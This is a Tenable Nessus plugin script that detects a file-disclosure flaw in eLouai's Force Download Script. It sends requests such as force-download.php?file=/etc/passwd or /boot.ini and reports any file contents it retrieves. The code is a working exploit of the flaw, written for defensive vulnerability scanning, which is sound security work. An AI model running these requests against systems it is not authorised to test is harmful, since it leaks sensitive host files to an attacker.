#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if (description)
{
  script_id(50511);
  script_version("$Revision: 1.9 $");
  script_cvs_date("$Date: 2015/09/24 21:08:39 $");

  script_bugtraq_id(44621);
  script_xref(name:"EDB-ID", value:"15404");

  script_name(english:"eLouai's Force Download Script file Parameter File Disclosure");
  script_summary(english:"Tries to read a local file");

  script_set_attribute(
    attribute:"synopsis",
    value:
"The remote web server hosts a PHP script affected by an information
disclosure vulnerability."
  );
  script_set_attribute(
    attribute:"description",
    value:
"The version of eLouai's Force Download Script hosted on the remote
web server does not sanitize user-supplied input to the 'file'
parameter before using it to return the contents of a file.

An unauthenticated, remote attacker can exploit this issue to disclose
the contents of sensitive files on the affected system subject to the
privileges under which the web server operates."
  );
  script_set_attribute(attribute:"solution", value:"Unknown at this time.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_set_cvss_temporal_vector("CVSS2#E:F/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"d2_elliot_name", value:"eLouai Force Download File Disclosure");
  script_set_attribute(attribute:"exploit_framework_d2_elliot", value:"true");

  script_set_attribute(attribute:"vuln_publication_date", value:"2010/11/03");
  script_set_attribute(attribute:"plugin_publication_date", value:"2010/11/08");

  script_set_attribute(attribute:"plugin_type", value:"remote");
  script_set_attribute(attribute:"cpe", value:"cpe:/a:elouai:force_download");
  script_set_attribute(attribute:"exploited_by_nessus", value:"true");
  script_end_attributes();

  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2010-2015 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_keys("www/PHP");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("audit.inc");
include("global_settings.inc");
include("misc_func.inc");
include("http.inc");
include("webapp_func.inc");


port = get_http_port(default:80, php:TRUE);


# Determine what to look for.
os = get_kb_item("Host/OS");
if (os)
{
  if ("Windows" >< os) file = '/boot.ini';
  else file = '/etc/passwd';
  files = make_list(file);
}
else files = make_list('/etc/passwd', '/boot.ini');

file_pats = make_array();
file_pats['/etc/passwd'] = "root:.*:0:[01]:";
file_pats['/boot.ini'] = "^ *\[boot loader\]";


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/download", "/downloads", "/files", cgi_dirs()));
else dirs = make_list(cgi_dirs());

contents = "";
found_file = "";
installs = 0;
vuln_urls = make_list();

foreach dir (dirs)
{
  # Verify the script exists.
  base_url = dir + '/force-download.php';
  res = http_send_recv3(method:"GET", item:base_url, port:port, exit_on_fail:TRUE);

  if (
    "title>eLouai's Download Script</title>" >< res[2] ||
    "NOT SPECIFIED. USE force-download.php?file=filepath</body" >< res[2]
  ) installs++;
  else continue;

  # Try to read a local file.
  foreach file (files)
  {
    # Once we find a file that works, stick with it for any subsequent tests.
    if (found_file && file != found_file) continue;

    url = base_url + '?file=' + file;
    res = http_send_recv3(method:"GET", item:url, port:port, exit_on_fail:TRUE);

    headers = parse_http_headers(status_line:res[0], headers:res[1]);
    if (isnull(headers)) exit(1, 'Error parsing HTTP headers on port '+port+'.');

    # There's a problem if we see the expected contents.
    body = res[2];
    file_pat = file_pats[file];

    if (
      (headers['content-type'] && 'application/force-download' >< headers['content-type']) &&
      egrep(pattern:file_pat, string:body)
    )
    {
      vuln_urls = make_list(vuln_urls, url);

      if (!contents)
      {
        found_file = file;

        contents = body;
        break;
      }
    }
  }
  if (found_file && !thorough_tests) break;
}

if (max_index(vuln_urls))
{
  if (report_verbosity > 0)
  {
    if (max_index(vuln_urls) == 1) s = '';
    else s = 's';
    header =
      'Nessus was able to exploit the issue to retrieve the contents of\n' +
      "'" + found_file + "' on the remote host using the following URL" + s;
    trailer = '';

    if (report_verbosity > 1)
    {
      trailer =
        'Here are its contents :\n' +
        '\n' +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n' +
        contents +
        crap(data:"-", length:30) + " snip " + crap(data:"-", length:30) + '\n';
    }
    report = get_vuln_report(items:vuln_urls, port:port, header:header, trailer:trailer);
    security_warning(port:port, extra:report);
  }
  else security_warning(port);
  exit(0);
}
else
{
  if (installs == 0) exit(0, "No installs of eLouai's Force Download Script were found on the web server on port "+port+".");
  else if (installs == 1) exit(0, "The eLouai's Force Download Script install hosted on the web server on port "+port+" is not affected.");
  else exit(0, "The eLouai's Force Download Script installs hosted on the web server on port "+port+" are not affected.");
}
